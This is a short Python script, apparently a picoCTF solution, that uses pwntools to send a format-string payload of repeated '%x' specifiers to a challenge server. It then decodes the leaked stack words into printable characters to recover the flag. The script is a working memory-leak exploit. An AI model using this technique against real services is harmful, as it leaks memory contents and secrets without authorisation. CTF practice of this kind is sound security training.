from pwn import *

p = remote('mercury.picoctf.net', 20195)

OFFSET = 40

s = ""

if __name__ == '__main__':
	p.sendlineafter(b"What would you like to do?\n", b"1")

	payload = b"%x" + b"-%x" * OFFSET + b"\n"

	p.sendlineafter(b"What is your API token?\n", payload)

	p.recvline()

	x = p.recvline()

	print(x)

	x = x[:-1].decode()

	for i in x.split('-'):
	    if len(i) == 8:
	        a = bytearray.fromhex(i)

	        for b in reversed(a):
	            if b > 32 and b < 128:
	                s += chr(b)

print(s)